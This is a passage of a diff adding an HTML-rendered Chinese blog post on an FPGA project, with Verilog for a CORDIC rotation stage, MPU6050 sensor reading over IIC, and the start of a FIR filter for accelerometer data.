+        Yn<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> Yn<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        Zn<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> Zn<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    end
+end
+
+
+<span class="token comment">//旋转</span>
+genvar i<span class="token punctuation">;</span>
+generate
+    <span class="token keyword">for</span><span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">1</span> <span class="token punctuation">;</span>i <span class="token operator">&lt;</span> <span class="token number">17</span> <span class="token punctuation">;</span>i <span class="token operator">=</span> i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>
+    begin<span class="token operator">:</span> loop2
+        always@<span class="token punctuation">(</span>posedge clk or negedge rst_n<span class="token punctuation">)</span>
+        begin
+            <span class="token keyword">if</span><span class="token punctuation">(</span> rst_n <span class="token operator">==</span> <span class="token number">1</span>'b0<span class="token punctuation">)</span>
+            begin
+                Xn<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> 'd0<span class="token punctuation">;</span>
+                Yn<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> 'd0<span class="token punctuation">;</span>
+                Zn<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> 'd0<span class="token punctuation">;</span>
+            end
+            <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span> cal_delay<span class="token punctuation">[</span>i <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span>'b1<span class="token punctuation">)</span>
+            begin
+                <span class="token keyword">if</span><span class="token punctuation">(</span> Yn<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span>'b0<span class="token punctuation">)</span>
+                begin
+                    Xn<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> Xn<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token punctuation">(</span>Yn<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token punctuation">(</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    Yn<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> Yn<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token punctuation">(</span>Xn<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token punctuation">(</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    Zn<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> Zn<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> rot<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+                end
+                <span class="token keyword">else</span>
+                begin
+                    Xn<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> Xn<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token punctuation">(</span>Yn<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token punctuation">(</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    Yn<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> Yn<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token punctuation">(</span>Xn<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token punctuation">(</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    Zn<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> Zn<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> rot<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+                end
+            end
+            <span class="token keyword">else</span>
+            begin
+                Xn<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> Xn<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
+                Yn<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> Yn<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
+                Zn<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> Zn<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
+            end
+        end
+    end
+endgenerate
+
+
+
+endmodule
+
+</code></pre> 
+<h3><a id="2MPU6050_264"></a>2、MPU6050采集数据</h3> 
+<p>      MPU6050模块的接口是IIC，所以驱动的实质也是通过IIC协议对模块进行读写，和OLED模块一样。其流程为：<br>       初试话相关寄存器，例如角速度和加速度的精度。<br>       读取MPU6050模块的ID，判断是否初始化完成。<br>       角速度和加速度的数据读取。</p> 
+<pre><code class="prism language-c">`timescale <span class="token number">1</span>ns <span class="token operator">/</span> <span class="token number">1</span>ps
+<span class="token comment">//**************************************** Message ***********************************//</span>
+<span class="token comment">//技术交流：bumianzhe@126.com</span>
+<span class="token comment">//关注CSDN博主：“千歌叹尽执夏”</span>
+<span class="token comment">//Author: FPGA之旅 &amp; 千歌叹尽执夏 </span>
+<span class="token comment">//All rights reserved	                               </span>
+<span class="token comment">//----------------------------------------------------------------------------------------</span>
+<span class="token comment">// Target Devices: 		H7P20N0L176-M2H1</span>
+<span class="token comment">// Tool Versions:       Fuxi 2023.1</span>
+<span class="token comment">// File name:           MPU6050_TOP</span>
+<span class="token comment">// Last modified Date:  2023年5月09日19:41:57</span>
+<span class="token comment">// Last Version:        V1.1</span>
+<span class="token comment">// Descriptions:        MPU6050数据采集</span>
+<span class="token comment">//----------------------------------------------------------------------------------------</span>
+<span class="token comment">//****************************************************************************************//</span>
+
+
+module <span class="token function">MPU6050_TOP</span><span class="token punctuation">(</span>
+
+    input                       clk<span class="token punctuation">,</span>
+    input                       rst_n<span class="token punctuation">,</span>
+
+ 
+    input                       mpu6050_req<span class="token punctuation">,</span>
+    output                      mpu6050_ack<span class="token punctuation">,</span>
+
+    
+    output   <span class="token keyword">signed</span> <span class="token punctuation">[</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>      GYROXo<span class="token punctuation">,</span>
+    output   <span class="token keyword">signed</span> <span class="token punctuation">[</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>      GYROYo<span class="token punctuation">,</span>
+    output   <span class="token keyword">signed</span> <span class="token punctuation">[</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>      GYROZo<span class="token punctuation">,</span>
+
+    output   <span class="token keyword">signed</span> <span class="token punctuation">[</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>      ACCELXo<span class="token punctuation">,</span>
+    output   <span class="token keyword">signed</span> <span class="token punctuation">[</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>      ACCELYo<span class="token punctuation">,</span>
+    output   <span class="token keyword">signed</span> <span class="token punctuation">[</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>      ACCELZo<span class="token punctuation">,</span>
+
+
+    output                      IICSCL<span class="token punctuation">,</span>             <span class="token comment">/*IIC 时钟输出*/</span>
+    inout                       IICSDA             <span class="token comment">/*IIC 数据线*/</span> 
+<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+
+localparam      S_IDLE          <span class="token operator">=</span>   'd0<span class="token punctuation">;</span>
+localparam      S_READ_GYRO     <span class="token operator">=</span>   'd1<span class="token punctuation">;</span>
+localparam      S_READ_ACCEL    <span class="token operator">=</span>   'd2<span class="token punctuation">;</span>  
+localparam      S_ACK           <span class="token operator">=</span>   'd3<span class="token punctuation">;</span>
+
+reg<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>    state <span class="token punctuation">,</span> next_state<span class="token punctuation">;</span>
+	
+<span class="token comment">//读取角速度</span>
+wire		ReadGYROReq<span class="token punctuation">;</span>
+wire <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>	GYROX<span class="token punctuation">;</span>
+wire <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>	GYROY<span class="token punctuation">;</span>
+wire <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>	GYROZ<span class="token punctuation">;</span>
+wire	    GYRODone<span class="token punctuation">;</span>
+
+<span class="token comment">//读取加速度</span>
+wire		ReadACCELReq<span class="token punctuation">;</span>
+wire <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>	ACCELX<span class="token punctuation">;</span>
+wire <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>	ACCELY<span class="token punctuation">;</span>
+wire <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>	ACCELZ<span class="token punctuation">;</span>
+wire		ACCELDone<span class="token punctuation">;</span>	
+
+
+assign      mpu6050_ack <span class="token operator">=</span> <span class="token punctuation">(</span>state <span class="token operator">==</span> S_ACK<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token number">1</span><span class="token char">'b1 : 1'</span>b0<span class="token punctuation">;</span>
+
+
+<span class="token comment">//减去零漂</span>
+assign      GYROXo      <span class="token operator">=</span> <span class="token punctuation">(</span>GYROX <span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token number">2</span> <span class="token punctuation">)</span> <span class="token operator">-</span> $<span class="token keyword">signed</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token comment">//  - $signed(37))  &gt;&gt;&gt; 2;</span>
+assign      GYROYo      <span class="token operator">=</span> <span class="token punctuation">(</span>GYROY <span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token number">2</span> <span class="token punctuation">)</span> <span class="token operator">+</span> $<span class="token keyword">signed</span><span class="token punctuation">(</span><span class="token number">6</span> <span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token comment">//  + $signed(198)) &gt;&gt;&gt; 2;</span>
+assign      GYROZo      <span class="token operator">=</span> <span class="token punctuation">(</span>GYROZ <span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token number">2</span> <span class="token punctuation">)</span> <span class="token operator">+</span> $<span class="token keyword">signed</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token comment">//  + $signed(14))  &gt;&gt;&gt; 2;</span>
+
+
+
+assign      ACCELXo     <span class="token operator">=</span>   ACCELX <span class="token punctuation">;</span> <span class="token comment">//需要归一的+-8g ，所以需要除以一个4096，为了保留精度，指除以256</span>
+assign      ACCELYo     <span class="token operator">=</span>   ACCELY <span class="token punctuation">;</span> <span class="token comment">//需要归一的+-8g ，所以需要除以一个4096，为了保留精度，指除以256</span>
+assign      ACCELZo     <span class="token operator">=</span>   ACCELZ <span class="token punctuation">;</span> <span class="token comment">//需要归一的+-8g ，所以需要除以一个4096，为了保留精度，指除以256</span>
+
+
+
+assign      ReadGYROReq <span class="token operator">=</span> <span class="token punctuation">(</span> state <span class="token operator">==</span> S_READ_GYRO<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token number">1</span><span class="token char">'b1 : 1'</span>b0<span class="token punctuation">;</span>
+assign      ReadACCELReq <span class="token operator">=</span> <span class="token punctuation">(</span> state <span class="token operator">==</span> S_READ_ACCEL<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token number">1</span><span class="token char">'b1 : 1'</span>b0<span class="token punctuation">;</span>
+
+always@<span class="token punctuation">(</span>posedge clk or negedge rst_n<span class="token punctuation">)</span> begin
+    <span class="token keyword">if</span><span class="token punctuation">(</span> rst_n <span class="token operator">==</span> <span class="token number">1</span>'b0<span class="token punctuation">)</span>
+        state <span class="token operator">&lt;=</span> S_IDLE<span class="token punctuation">;</span>
+    <span class="token keyword">else</span>
+        state <span class="token operator">&lt;=</span> next_state<span class="token punctuation">;</span>
+end
+
+always@<span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span>begin
+    <span class="token keyword">case</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span>
+    S_IDLE<span class="token operator">:</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span> mpu6050_req <span class="token operator">==</span> <span class="token number">1</span>'b1 <span class="token punctuation">)</span>
+            next_state <span class="token operator">&lt;=</span> S_READ_GYRO<span class="token punctuation">;</span>
+        <span class="token keyword">else</span>
+            next_state <span class="token operator">&lt;=</span> S_IDLE<span class="token punctuation">;</span>
+    S_READ_GYRO<span class="token operator">:</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span> GYRODone <span class="token operator">==</span> <span class="token number">1</span>'b1<span class="token punctuation">)</span>
+            next_state <span class="token operator">&lt;=</span> S_READ_ACCEL<span class="token punctuation">;</span>
+        <span class="token keyword">else</span>
+            next_state <span class="token operator">&lt;=</span> S_READ_GYRO<span class="token punctuation">;</span>
+    S_READ_ACCEL<span class="token operator">:</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span> ACCELDone <span class="token operator">==</span> <span class="token number">1</span>'b1<span class="token punctuation">)</span>
+            next_state <span class="token operator">&lt;=</span> S_ACK<span class="token punctuation">;</span>
+        <span class="token keyword">else</span>
+            next_state <span class="token operator">&lt;=</span> S_READ_ACCEL<span class="token punctuation">;</span>
+    S_ACK<span class="token operator">:</span>
+        next_state <span class="token operator">&lt;=</span> S_IDLE<span class="token punctuation">;</span>
+    <span class="token keyword">default</span><span class="token operator">:</span> next_state <span class="token operator">&lt;=</span> S_IDLE<span class="token punctuation">;</span>
+    endcase
+end
+
+
+
+MPU6050_Read    <span class="token function">u_MPU6050_Read</span><span class="token punctuation">(</span>
+	
+	<span class="token punctuation">.</span><span class="token function">clk</span>                        <span class="token punctuation">(</span>       clk         <span class="token punctuation">)</span><span class="token punctuation">,</span>
+	<span class="token punctuation">.</span><span class="token function">rst</span>                        <span class="token punctuation">(</span>       rst_n       <span class="token punctuation">)</span><span class="token punctuation">,</span>
+
+	<span class="token punctuation">.</span><span class="token function">SCL</span>                        <span class="token punctuation">(</span>       IICSCL      <span class="token punctuation">)</span><span class="token punctuation">,</span>
+	<span class="token punctuation">.</span><span class="token function">SDA</span>                        <span class="token punctuation">(</span>       IICSDA      <span class="token punctuation">)</span><span class="token punctuation">,</span>
+	
+	
+	<span class="token comment">//读取角速度</span>
+	<span class="token punctuation">.</span><span class="token function">ReadGYROReq</span>                <span class="token punctuation">(</span>       ReadGYROReq <span class="token punctuation">)</span><span class="token punctuation">,</span>
+	<span class="token punctuation">.</span><span class="token function">GYROX</span>                      <span class="token punctuation">(</span>       GYROX       <span class="token punctuation">)</span><span class="token punctuation">,</span>
+	<span class="token punctuation">.</span><span class="token function">GYROY</span>                      <span class="token punctuation">(</span>       GYROY       <span class="token punctuation">)</span><span class="token punctuation">,</span>
+	<span class="token punctuation">.</span><span class="token function">GYROZ</span>                      <span class="token punctuation">(</span>       GYROZ       <span class="token punctuation">)</span><span class="token punctuation">,</span>
+	<span class="token punctuation">.</span><span class="token function">GYRODone</span>                   <span class="token punctuation">(</span>       GYRODone    <span class="token punctuation">)</span><span class="token punctuation">,</span>
+	
+	<span class="token comment">//读取加速度</span>
+	<span class="token punctuation">.</span><span class="token function">ReadACCELReq</span>               <span class="token punctuation">(</span>       ReadACCELReq<span class="token punctuation">)</span><span class="token punctuation">,</span>
+	<span class="token punctuation">.</span><span class="token function">ACCELX</span>                     <span class="token punctuation">(</span>       ACCELX      <span class="token punctuation">)</span><span class="token punctuation">,</span>
+	<span class="token punctuation">.</span><span class="token function">ACCELY</span>                     <span class="token punctuation">(</span>       ACCELY      <span class="token punctuation">)</span><span class="token punctuation">,</span>
+	<span class="token punctuation">.</span><span class="token function">ACCELZ</span>                     <span class="token punctuation">(</span>       ACCELZ      <span class="token punctuation">)</span><span class="token punctuation">,</span>
+	<span class="token punctuation">.</span><span class="token function">ACCELDone</span>                  <span class="token punctuation">(</span>       ACCELDone   <span class="token punctuation">)</span>	
+<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+endmodule
+
+</code></pre> 
+<h3><a id="3firiir_416"></a>3、fir&amp;iir滤波</h3> 
+<p>      MPU6050芯片提供的数据夹杂有较严重的噪音，在芯片处理静止状态时数据摆动都可能超过2%。除了噪音，各项数据还会有偏移的现象，也就是说数据并不是围绕静止工作点摆动，因此要先对数据偏移进行校准 ，再通过滤波算法消除噪音。<br>       有关fir&amp;iir滤波器的相关理论请参照一下文章，这里不做过多赘述：<br> https://www.zhihu.com/question/323353814（如何通俗易懂地理解FIR/IIR滤波器？）</p> 
+<p><font size="4.5" color="red">fir滤波：加速度滤波</font><br>       加速度信号通常包含相对较低频率的变化，因为它主要反映物体的线性运动。在这种情况下，FIR滤波器可能更适合，因为它可以提供较好的静态响应，对于低频信号的滤波效果较好。</p> 
+<pre><code class="prism language-c">`timescale <span class="token number">1</span>ns <span class="token operator">/</span> <span class="token number">1</span>ps
+<span class="token comment">//**************************************** Message ***********************************//</span>
+<span class="token comment">//技术交流：bumianzhe@126.com</span>
+<span class="token comment">//关注CSDN博主：“千歌叹尽执夏”</span>
+<span class="token comment">//Author: FPGA之旅 &amp; 千歌叹尽执夏 </span>
+<span class="token comment">//All rights reserved	                               </span>
+<span class="token comment">//----------------------------------------------------------------------------------------</span>
+<span class="token comment">// Target Devices: 		H7P20N0L176-M2H1</span>
+<span class="token comment">// Tool Versions:       Fuxi 2023.1</span>
+<span class="token comment">// File name:           MPU6050_fir_filter</span>
+<span class="token comment">// Last modified Date:  2023年12月9日13:46:00</span>
+<span class="token comment">// Last Version:        V1.1</span>
+<span class="token comment">// Descriptions:        fir滤波器</span>
+<span class="token comment">//----------------------------------------------------------------------------------------</span>
+<span class="token comment">//****************************************************************************************//</span>
+
+
+module <span class="token function">MPU6050_fir_filter</span><span class="token punctuation">(</span>
+    input                   sys_clk_i                   <span class="token punctuation">,</span>   <span class="token comment">//系统时钟</span>
+    input                   sys_rst_n_i                 <span class="token punctuation">,</span>   <span class="token comment">//系统复位</span>
+
+    input                   fir_filter_req_i            <span class="token punctuation">,</span>   <span class="token comment">//fir滤波请求</span>
+    output                  fir_filter_ack_o            <span class="token punctuation">,</span>   <span class="token comment">//fir滤波响应</span>
+
+    
+    input <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>      data_i                      <span class="token punctuation">,</span>   <span class="token comment">//输入待滤波数据</span>
+    output reg <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span> filter_data_o                   <span class="token comment">//滤波后的数据</span>
+
+<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+reg fir_filter_en<span class="token punctuation">;</span>
+
+reg<span class="token punctuation">[</span><span class="token number">4</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span> fir_filter_step_cnt<span class="token punctuation">;</span>
+<span class="token comment">//滤波器系数 扩大了255倍</span>
+localparam COE_0 <span class="token operator">=</span> $<span class="token keyword">signed</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//16'h04f0;</span>
+localparam COE_1 <span class="token operator">=</span> $<span class="token keyword">signed</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//16'hf410;</span>
+localparam COE_2 <span class="token operator">=</span> $<span class="token keyword">signed</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//16'hf334;</span>
+localparam COE_3 <span class="token operator">=</span> $<span class="token keyword">signed</span><span class="token punctuation">(</span><span class="token number">81</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//16'h2587;</span>
+localparam COE_4 <span class="token operator">=</span> $<span class="token keyword">signed</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//16'h4b72;</span>
+localparam COE_5 <span class="token operator">=</span> $<span class="token keyword">signed</span><span class="token punctuation">(</span><span class="token number">81</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//16'h2587;</span>
+localparam COE_6 <span class="token operator">=</span> $<span class="token keyword">signed</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//16'hf334;</span>
+localparam COE_7 <span class="token operator">=</span> $<span class="token keyword">signed</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//16'hf410;</span>
+localparam COE_8 <span class="token operator">=</span> $<span class="token keyword">signed</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//16'h04f0;</span>
+
+
+reg <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span> data_save0<span class="token punctuation">;</span>
+reg <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span> data_save1<span class="token punctuation">;</span>
+reg <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span> data_save2<span class="token punctuation">;</span>
+reg <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span> data_save3<span class="token punctuation">;</span>
+reg <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span> data_save4<span class="token punctuation">;</span>
+reg <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span> data_save5<span class="token punctuation">;</span>
+reg <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span> data_save6<span class="token punctuation">;</span>
+reg <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span> data_save7<span class="token punctuation">;</span>
+reg <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span> data_save8<span class="token punctuation">;</span>
+
+
+reg <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>   mul_a<span class="token punctuation">,</span>mul_b<span class="token punctuation">;</span>
+wire <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">31</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>   mul_ab<span class="token punctuation">;</span>
+
+
+reg <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">23</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>   add_out<span class="token punctuation">;</span>
+
+
+assign fir_filter_ack_o <span class="token operator">=</span> <span class="token punctuation">(</span> fir_filter_step_cnt <span class="token operator">==</span> <span class="token char">'d9) ? 1'</span>b1 <span class="token operator">:</span> <span class="token number">1</span>'b0<span class="token punctuation">;</span>
+
+always@<span class="token punctuation">(</span>posedge sys_clk_i or negedge sys_rst_n_i<span class="token punctuation">)</span> begin
+    <span class="token keyword">if</span><span class="token punctuation">(</span> sys_rst_n_i <span class="token operator">==</span> <span class="token number">1</span>'b0<span class="token punctuation">)</span> begin
+        data_save0  <span class="token operator">&lt;=</span> 'd0<span class="token punctuation">;</span>
+        data_save1  <span class="token operator">&lt;=</span> 'd0<span class="token punctuation">;</span>
+        data_save2  <span class="token operator">&lt;=</span> 'd0<span class="token punctuation">;</span>
+        data_save3  <span class="token operator">&lt;=</span> 'd0<span class="token punctuation">;</span>
+        data_save4  <span class="token operator">&lt;=</span> 'd0<span class="token punctuation">;</span>
+        data_save5  <span class="token operator">&lt;=</span> 'd0<span class="token punctuation">;</span>
+        data_save6  <span class="token operator">&lt;=</span> 'd0<span class="token punctuation">;</span>
+        data_save7  <span class="token operator">&lt;=</span> 'd0<span class="token punctuation">;</span>
+        data_save8  <span class="token operator">&lt;=</span> 'd0<span class="token punctuation">;</span>
+    end
+    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span> fir_filter_req_i <span class="token operator">==</span> <span class="token number">1</span><span class="token char">'b1 &amp;&amp; fir_filter_en== 1'</span>b0<span class="token punctuation">)</span> begin
+        data_save0  <span class="token operator">&lt;=</span> data_i<span class="token punctuation">;</span>
+        data_save1  <span class="token operator">&lt;=</span> data_save0<span class="token punctuation">;</span>
+        data_save2  <span class="token operator">&lt;=</span> data_save1<span class="token punctuation">;</span>
+        data_save3  <span class="token operator">&lt;=</span> data_save2<span class="token punctuation">;</span>
+        data_save4  <span class="token operator">&lt;=</span> data_save3<span class="token punctuation">;</span>
+        data_save5  <span class="token operator">&lt;=</span> data_save4<span class="token punctuation">;</span>
+        data_save6  <span class="token operator">&lt;=</span> data_save5<span class="token punctuation">;</span>
+        data_save7  <span class="token operator">&lt;=</span> data_save6<span class="token punctuation">;</span>
+        data_save8  <span class="token operator">&lt;=</span> data_save7<span class="token punctuation">;</span>
+
+    end
+    <span class="token keyword">else</span> begin
+        data_save0  <span class="token operator">&lt;=</span> data_save0<span class="token punctuation">;</span>
+        data_save1  <span class="token operator">&lt;=</span> data_save1<span class="token punctuation">;</span>
+        data_save2  <span class="token operator">&lt;=</span> data_save2<span class="token punctuation">;</span>
+        data_save3  <span class="token operator">&lt;=</span> data_save3<span class="token punctuation">;</span>
+        data_save4  <span class="token operator">&lt;=</span> data_save4<span class="token punctuation">;</span>
+        data_save5  <span class="token operator">&lt;=</span> data_save5<span class="token punctuation">;</span>
+        data_save6  <span class="token operator">&lt;=</span> data_save6<span class="token punctuation">;</span>
+        data_save7  <span class="token operator">&lt;=</span> data_save7<span class="token punctuation">;</span>
+        data_save8  <span class="token operator">&lt;=</span> data_save8<span class="token punctuation">;</span>
+
+    end
+end
+
+
+always@<span class="token punctuation">(</span>posedge sys_clk_i or negedge sys_rst_n_i<span class="token punctuation">)</span> begin
+    <span class="token keyword">if</span><span class="token punctuation">(</span> sys_rst_n_i <span class="token operator">==</span> <span class="token number">1</span>'b0 <span class="token punctuation">)</span>
+        fir_filter_en <span class="token operator">&lt;=</span> <span class="token number">1</span>'b0<span class="token punctuation">;</span>
+    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span> fir_filter_ack_o <span class="token operator">==</span> <span class="token number">1</span>'b1<span class="token punctuation">)</span>
+        fir_filter_en <span class="token operator">&lt;=</span> <span class="token number">1</span>'b0<span class="token punctuation">;</span>
+    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span> fir_filter_req_i <span class="token operator">==</span> <span class="token number">1</span>'b1<span class="token punctuation">)</span>
+        fir_filter_en <span class="token operator">&lt;=</span> <span class="token number">1</span>'b1<span class="token punctuation">;</span>
+    <span class="token keyword">else</span>
+        fir_filter_en <span class="token operator">&lt;=</span> fir_filter_en<span class="token punctuation">;</span>
+end
+
+
+always@<span class="token punctuation">(</span>posedge sys_clk_i or negedge sys_rst_n_i <span class="token punctuation">)</span>begin
